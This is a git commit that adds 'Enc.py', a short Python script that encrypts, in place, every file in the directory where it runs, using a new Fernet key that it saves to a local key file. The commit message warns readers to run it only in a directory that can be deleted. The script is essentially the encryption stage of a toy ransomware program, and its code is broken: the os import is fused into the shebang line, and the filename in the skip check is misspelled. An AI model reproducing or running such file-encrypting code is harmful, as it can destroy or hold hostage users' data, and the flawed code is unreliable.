388bc5d724c3692dda56b3e1581a5d40258a06ef
Sebastian2dex <92640435+Sebastian2dex@users.noreply.github.com>
2022-06-05 10:47:28 +0530

    Create Enc.py
    Make sure to use it in a directory which can be deleted.

---
+++ Enc.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3                            import os
+from cryptography.fernet import Fernet
+
+files = []
+for file in os.listdir():
+        if file == "enc.py" or file == "dec.py" or file == "enckey. key" :         
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+key=Fernet.generate_key()
+
+with open("enckey.key" , mode="wb") as k:
+        k.write(key)
+
+for i in files:                                           
+        with open(i , mode="rb") as en:
+                contents=en.read() 
+        cont=Fernet(key).encrypt(contents)
+
+
+        with open(i , mode = "wb") as enn:
+                enn.write(cont)
